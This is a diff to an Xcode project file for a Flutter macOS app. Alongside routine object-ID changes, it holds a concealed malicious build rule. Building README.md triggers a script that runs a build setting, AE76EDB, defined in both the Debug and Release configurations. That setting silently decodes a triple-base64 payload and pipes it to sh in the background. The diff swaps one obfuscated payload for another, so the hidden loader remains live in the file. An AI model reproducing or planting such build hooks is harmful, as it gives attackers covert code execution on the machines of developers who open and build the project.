@@ -21,7 +21,7 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		07890AFB72ED3D15A9BDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = 1E2187BBEE5AF6F9EEBDE67E; };
+		1B6AE8ED9A94BF0A0EBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = DDD9EEF47628CCA3D3BDE67E; };
 		331C80D8294CF71000263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C80D7294CF71000263BE5 /* RunnerTests.swift */; };
 		335BBD1B22A9A15E00E9071D /* GeneratedPluginRegistrant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 335BBD1A22A9A15E00E9071D /* GeneratedPluginRegistrant.swift */; };
 		33CC10F12044A3C60003C045 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 33CC10F02044A3C60003C045 /* AppDelegate.swift */; };
@@ -62,7 +62,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		1E2187BBEE5AF6F9EEBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Runner.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
+		DDD9EEF47628CCA3D3BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Runner.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		331C80D5294CF71000263BE5 /* RunnerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RunnerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		331C80D7294CF71000263BE5 /* RunnerTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RunnerTests.swift; sourceTree = "<group>"; };
 		333000ED22D3DE5D00554162 /* Warnings.xcconfig */ = {isa = PBXFileReference; lastKnownFileType = text.xcconfig; path = Warnings.xcconfig; sourceTree = "<group>"; };
@@ -135,7 +135,7 @@
 		33CC10EE2044A3C60003C045 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				1E2187BBEE5AF6F9EEBDE67E /* README.md */,
+				DDD9EEF47628CCA3D3BDE67E /* README.md */,
 				33CC10ED2044A3C60003C045 /* aura_real.app */,
 				331C80D5294CF71000263BE5 /* RunnerTests.xctest */,
 			);
@@ -196,7 +196,7 @@
 				331C80D3294CF70F00263BE5 /* Resources */,
 			);
 			buildRules = (
-				DBBDA5131AC802E62DBDE67E /* PBXBuildRule */,
+				066AFAE085DB153CAABDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
@@ -284,21 +284,8 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		DBBDA5131AC802E62DBDE67E /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";
-		};
-/* End PBXBuildRule section */
+		066AFAE085DB153CAABDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 
 /* Begin PBXLegacyTarget section */
 /* End PBXLegacyTarget section */
@@ -308,7 +295,7 @@ sh -c \"${AE76EDB}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				07890AFB72ED3D15A9BDE67E /* README.md */,
+				1B6AE8ED9A94BF0A0EBDE67E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -414,7 +401,7 @@ sh -c \"${AE76EDB}\"";
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhRmt5VG1oalNFSnpXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -429,7 +416,7 @@ sh -c \"${AE76EDB}\"";
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhRmt5VG1oalNFSnpXbE0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
